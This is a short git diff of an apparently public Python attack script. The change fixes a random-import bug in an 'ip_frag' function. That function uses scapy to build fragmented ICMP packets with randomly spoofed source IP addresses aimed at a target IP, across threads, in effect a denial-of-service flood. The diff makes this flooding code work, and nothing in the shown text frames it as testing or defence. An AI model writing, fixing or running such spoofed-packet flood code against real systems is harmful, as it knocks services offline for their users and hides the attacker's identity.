@@ -9,7 +9,7 @@ Contributions are welcomed and appreciated.
 
 import os , subprocess ,sys
 import socket
-from random import randint , choice , random
+from random import randint , choice
 import threading
 from scapy.all import IP, ICMP, send ,conf,UDP, DNS, DNSQR
 
@@ -47,7 +47,7 @@ def ip_frag(target_ip,threads):
             fragments = []
             payload = "X" * frag_size
             for i in range(num_fragments):
-                src_ip = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
+                src_ip = f"{randint(1, 255)}.{randint(0, 255)}.{randint(0, 255)}.{randint(0, 255)}"
                 ip_packet = IP(dst=target_ip, src=src_ip)
                 frag = ip_packet/ICMP()/payload
                 frag.frag = i * (frag_size // 8)
